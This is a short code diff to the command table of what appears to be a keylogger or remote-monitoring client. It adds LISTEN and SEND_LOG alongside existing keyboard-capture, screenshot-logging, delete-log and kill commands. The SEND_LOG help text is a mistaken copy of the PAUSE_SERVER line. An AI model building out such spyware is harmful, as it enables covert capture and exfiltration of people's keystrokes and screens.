@@ -13,13 +13,14 @@ TASKS = [
         "START_LOG_PICTURE",#
         "STATUS_SERVER",#
         "STATUS_LOG",#
-        "RESET_CONFIG",#
+        "LISTEN",#
         "KILL",#
         "LOG_TIMER",#
         "DELETE_LOG",#
         "MOVE",#
         "PING",
         "PICTURE_MODE",
+        "SEND_LOG",
         "HELP"
     ]
 
@@ -44,8 +45,10 @@ TASKS_DESCRIPTION = [
     "Delete log",
     "Move the client",
     "Ping the server",
+    "send log",
     "Change picture mode [timer => Number in secondes or click => Number of click recommanded 50]",
     """
+    SEND_LOG :          Server will be paused
     PAUSE_SERVER :          Server will be paused
     STOP_SERVER :           Server will be stopped
     STOP_CAPTURE_KEYBOARD : Keyboard capture will be stopped
